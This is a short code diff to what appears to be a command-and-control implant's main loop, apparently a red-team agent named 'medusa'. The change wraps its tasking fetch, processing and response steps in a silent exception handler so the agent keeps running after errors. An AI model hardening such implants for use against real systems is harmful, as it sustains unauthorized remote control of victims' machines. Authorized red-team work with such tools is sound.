@@ -492,10 +492,12 @@ class medusa:
                 while(True):
                     if self.passedKilldate():
                         self.exit()
-                    self.getTaskings()
-                    self.processTaskings()
-                    self.postResponses()
-                    self.agentSleep()                    
+                    try:
+                        self.getTaskings()
+                        self.processTaskings()
+                        self.postResponses()
+                    except: pass
+                    self.agentSleep()                   
 
 if __name__ == "__main__":
     medusa = medusa()
